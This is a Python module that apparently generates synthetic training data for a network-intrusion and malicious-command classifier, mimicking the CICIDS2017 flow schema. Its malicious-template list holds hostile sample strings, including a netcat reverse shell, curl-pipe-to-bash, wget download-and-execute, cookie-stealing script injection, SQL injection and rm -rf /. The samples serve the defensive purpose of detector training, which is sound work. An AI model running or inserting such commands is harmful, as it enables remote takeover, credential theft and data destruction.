"""Synthetic data generation matching the CICIDS2017 schema.

Why synthetic (interview point): the real CICIDS2017 set is ~2.8M rows / ~2.8 GB
and the real Bosch data is proprietary. A schema-faithful synthetic generator
lets the *entire* pipeline — preprocessing, training, serving, drift, retraining,
CI — run in seconds and stay fully reproducible. The generator deliberately
reproduces the dataset's real pain points (severe class imbalance, Inf/NaN in
rate columns, duplicate flows) so the preprocessing and tests are exercised
exactly as they would be on real data. Dropping real CICIDS2017 CSVs into
``data/raw/`` swaps in real data with no code change (see ``loaders.py``).

Determinism: every random draw comes from a single seeded ``numpy.Generator``,
so the same (seed, params) always yields a byte-identical dataset — the property
that makes ``dvc repro`` and the unit tests meaningful.
"""

from __future__ import annotations

import numpy as np
import pandas as pd

from threat_detection.config import TabularDataConfig, TextDataConfig
from threat_detection.data import schema

# ---------------------------------------------------------------------------
# Tabular (network flow) generation
# ---------------------------------------------------------------------------

# Per-class multipliers applied to the SIGNAL_FEATURES base distribution.
# These give each class a distinct, learnable fingerprint (e.g. PortScan has
# short flows to many destination ports; DDoS has huge packet counts).
_CLASS_SIGNAL_PROFILE: dict[str, dict[str, float]] = {
    schema.BENIGN_LABEL: {
        "Flow Duration": 1.0,
        "Total Fwd Packets": 1.0,
        "Flow Bytes/s": 1.0,
        "SYN Flag Count": 0.2,
        "Destination Port": 1.0,
        "Packet Length Mean": 1.0,
    },
    "DoS": {
        "Flow Duration": 0.3,
        "Total Fwd Packets": 4.0,
        "Flow Bytes/s": 6.0,
        "SYN Flag Count": 3.0,
        "Destination Port": 0.5,
        "Packet Length Mean": 1.4,
    },
    "DDoS": {
        "Flow Duration": 0.2,
        "Total Fwd Packets": 8.0,
        "Flow Bytes/s": 9.0,
        "SYN Flag Count": 4.0,
        "Destination Port": 0.4,
        "Packet Length Mean": 1.6,
    },
    "PortScan": {
        "Flow Duration": 0.05,
        "Total Fwd Packets": 0.3,
        "Flow Bytes/s": 0.4,
        "SYN Flag Count": 5.0,
        "Destination Port": 3.0,
        "Packet Length Mean": 0.3,
    },
    "Brute Force": {
        "Flow Duration": 1.8,
        "Total Fwd Packets": 2.0,
        "Flow Bytes/s": 1.5,
        "SYN Flag Count": 1.5,
        "Destination Port": 0.8,
        "Packet Length Mean": 0.9,
    },
    "Web Attack": {
        "Flow Duration": 1.4,
        "Total Fwd Packets": 1.6,
        "Flow Bytes/s": 1.3,
        "SYN Flag Count": 1.2,
        "Destination Port": 1.1,
        "Packet Length Mean": 1.2,
    },
    "Botnet": {
        "Flow Duration": 2.5,
        "Total Fwd Packets": 0.8,
        "Flow Bytes/s": 0.7,
        "SYN Flag Count": 0.9,
        "Destination Port": 1.3,
        "Packet Length Mean": 0.8,
    },
    "Infiltration": {
        "Flow Duration": 3.0,
        "Total Fwd Packets": 0.5,
        "Flow Bytes/s": 0.5,
        "SYN Flag Count": 0.6,
        "Destination Port": 1.5,
        "Packet Length Mean": 1.1,
    },
}


def _build_label_vector(cfg: TabularDataConfig, rng: np.random.Generator) -> np.ndarray:
    """Construct the label array honouring benign_ratio and attack_mix."""
    n = cfg.n_rows
    n_benign = round(n * cfg.benign_ratio)
    n_attack = n - n_benign

    labels = [schema.BENIGN_LABEL] * n_benign
    # Distribute the attack budget across classes by the configured mix.
    classes = list(cfg.attack_mix.keys())
    probs = np.array([cfg.attack_mix[c] for c in classes], dtype=float)
    probs = probs / probs.sum()
    counts = np.floor(probs * n_attack).astype(int)
    # Hand any rounding remainder to the largest class so counts sum exactly.
    counts[int(np.argmax(probs))] += n_attack - counts.sum()
    for cls, cnt in zip(classes, counts, strict=True):
        labels.extend([cls] * int(cnt))

    labels_arr = np.array(labels, dtype=object)
    rng.shuffle(labels_arr)  # de-cluster classes (in-place, seeded)
    return labels_arr


def _draw_base_features(n: int, rng: np.random.Generator) -> dict[str, np.ndarray]:
    """Draw plausible base distributions for every flow feature.

    Non-signal features get generic positive distributions; signal features get
    a base that is later scaled per class. Counts/flags are integer-like.
    """
    cols: dict[str, np.ndarray] = {}
    for feat in schema.FLOW_FEATURES:
        if feat == "Destination Port":
            cols[feat] = rng.integers(0, 65535, size=n).astype(float)
        elif "Flag" in feat or "PSH" in feat or "URG" in feat:
            cols[feat] = rng.poisson(0.5, size=n).astype(float)
        elif feat.startswith(("Total", "Subflow", "act_data", "Fwd Header", "Bwd Header")):
            cols[feat] = rng.gamma(shape=2.0, scale=50.0, size=n)
        elif "Duration" in feat or "IAT" in feat or "Idle" in feat or "Active" in feat:
            cols[feat] = rng.gamma(shape=1.5, scale=1.0e5, size=n)
        else:
            cols[feat] = rng.gamma(shape=2.0, scale=20.0, size=n)
    return cols


def _apply_class_signal(
    cols: dict[str, np.ndarray],
    labels: np.ndarray,
    drift_scale: float,
) -> None:
    """Scale signal features in-place per row according to its class profile.

    ``drift_scale`` (>1.0) inflates attack signal features to simulate concept
    drift for Sprint 6 without changing benign rows.
    """
    for cls in schema.ALL_LABELS:
        mask = labels == cls
        if not mask.any():
            continue
        profile = _CLASS_SIGNAL_PROFILE[cls]
        for feat, mult in profile.items():
            effective = mult
            if cls != schema.BENIGN_LABEL and drift_scale != 1.0:
                effective = mult * drift_scale
            cols[feat][mask] = cols[feat][mask] * effective


def _inject_quality_issues(
    df: pd.DataFrame, cfg: TabularDataConfig, rng: np.random.Generator
) -> pd.DataFrame:
    """Inject Inf/NaN into rate columns and duplicate a fraction of rows.

    Mirrors the documented CICIDS2017 quirks so preprocessing is non-trivial.
    """
    n = len(df)

    # Inf / NaN into rate columns (alternating, like real divide-by-zero rates).
    if cfg.inf_nan_fraction > 0:
        for col in schema.RATE_FEATURES:
            k = int(n * cfg.inf_nan_fraction)
            if k == 0:
                continue
            idx = rng.choice(n, size=k, replace=False)
            half = k // 2
            df.loc[df.index[idx[:half]], col] = np.inf
            df.loc[df.index[idx[half:]], col] = np.nan

    # Duplicate flows (exact row copies appended, then re-shuffled).
    if cfg.duplicate_fraction > 0:
        k = int(n * cfg.duplicate_fraction)
        if k > 0:
            dup_idx = rng.choice(n, size=k, replace=True)
            dup = df.iloc[dup_idx].copy()
            df = pd.concat([df, dup], ignore_index=True)
            df = df.sample(frac=1.0, random_state=int(rng.integers(0, 2**31))).reset_index(
                drop=True
            )
    return df


def generate_tabular(
    cfg: TabularDataConfig,
    seed: int,
    *,
    drift_scale: float = 1.0,
) -> pd.DataFrame:
    """Generate a synthetic CICIDS2017-schema flow table.

    Args:
        cfg: Validated tabular data config.
        seed: Master seed for full reproducibility.
        drift_scale: Multiplicative shift on attack signal features (Sprint 6).

    Returns:
        DataFrame with all 78 flow features plus the ``Label`` column, including
        injected Inf/NaN and duplicate rows.
    """
    rng = np.random.default_rng(seed)
    labels = _build_label_vector(cfg, rng)
    cols = _draw_base_features(len(labels), rng)
    _apply_class_signal(cols, labels, drift_scale)

    df = pd.DataFrame(cols, columns=list(schema.FLOW_FEATURES))
    df[schema.LABEL_COLUMN] = labels
    df = _inject_quality_issues(df, cfg, rng)
    return df


# ---------------------------------------------------------------------------
# Text (command / payload) generation
# ---------------------------------------------------------------------------

_BENIGN_TEMPLATES: tuple[str, ...] = (
    "ls -la /home/{user}",
    "cd /var/log && tail -n 100 {file}.log",
    "git pull origin main",
    "systemctl status {svc}",
    "GET /api/v1/{res}?page={n} HTTP/1.1",
    "python manage.py migrate",
    "df -h && free -m",
    "curl https://api.internal/{res}/{n}",
    "SELECT name FROM {res} WHERE id = {n}",
    "docker ps --filter name={svc}",
)

_MALICIOUS_TEMPLATES: tuple[str, ...] = (
    "'; DROP TABLE {res}; --",
    "' OR '1'='1' UNION SELECT password FROM users --",
    "; cat /etc/passwd; nc {ip} {n} -e /bin/sh",
    "$(curl http://{ip}/x.sh | bash)",
    "GET /../../../../etc/shadow HTTP/1.1",
    "<script>document.location='http://{ip}/c?'+document.cookie</script>",
    "wget http://{ip}/m.bin -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x",
    "admin' AND SLEEP(5)-- -",
    "powershell -enc {b64}",
    "; rm -rf / --no-preserve-root",
)

_WORDS = ("backup", "session", "config", "report", "orders", "auth", "nginx", "redis")


def _fill_template(tmpl: str, rng: np.random.Generator) -> str:
    return tmpl.format(
        user=rng.choice(["alice", "bob", "svc"]),
        file=rng.choice(["app", "sys", "access"]),
        svc=rng.choice(["nginx", "redis", "sshd"]),
        res=rng.choice(_WORDS),
        n=int(rng.integers(1, 9999)),
        ip=f"{rng.integers(1, 255)}.{rng.integers(0, 255)}.{rng.integers(0, 255)}."
        f"{rng.integers(1, 255)}",
        b64="".join(rng.choice(list("ABCDEFabcdef0123456789+/"), size=24)),
    )


def generate_text(cfg: TextDataConfig, seed: int) -> pd.DataFrame:
    """Generate a labelled command/payload corpus (0 = benign, 1 = malicious)."""
    rng = np.random.default_rng(seed + 1)  # offset so it differs from tabular
    n = cfg.n_rows
    n_mal = round(n * cfg.malicious_ratio)
    n_ben = n - n_mal

    rows: list[tuple[str, int]] = []
    for _ in range(n_ben):
        rows.append((_fill_template(rng.choice(_BENIGN_TEMPLATES), rng), 0))
    for _ in range(n_mal):
        rows.append((_fill_template(rng.choice(_MALICIOUS_TEMPLATES), rng), 1))

    df = pd.DataFrame(rows, columns=[schema.TEXT_COLUMN, schema.TEXT_LABEL_COLUMN])
    return df.sample(frac=1.0, random_state=seed).reset_index(drop=True)
